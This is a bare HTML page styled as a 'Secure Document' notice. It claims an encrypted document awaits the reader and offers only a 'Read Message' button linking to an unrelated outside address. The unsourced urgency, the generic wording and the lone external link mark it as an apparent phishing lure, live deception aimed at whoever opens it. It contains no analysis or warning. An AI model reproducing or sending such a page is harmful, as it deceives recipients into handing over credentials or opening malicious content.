<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Document</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    .header-icon {
      font-size: 50px;
      color: #2c7be5;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }
    p {
      font-size: 16px;
      margin-bottom: 30px;
      color: #555;
    }
    .button {
      display: inline-block;
      padding: 12px 24px;
      font-size: 16px;
      color: #fff;
      background-color: #2c7be5;
      text-decoration: none;
      border-radius: 6px;
      transition: background-color 0.3s;
    }
    .button:hover {
      background-color: #1a5dcc;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header-icon">🔒</div>
    <h1>Secure Document</h1>
    <p>A secure document has been sent to you through encrypted delivery. Click Read Message below to securely access the shared content.</p>
    <a href="https://faisallaw.cc/bf379w" class="button">Read Message</a>
  </div>
</body>
</html>
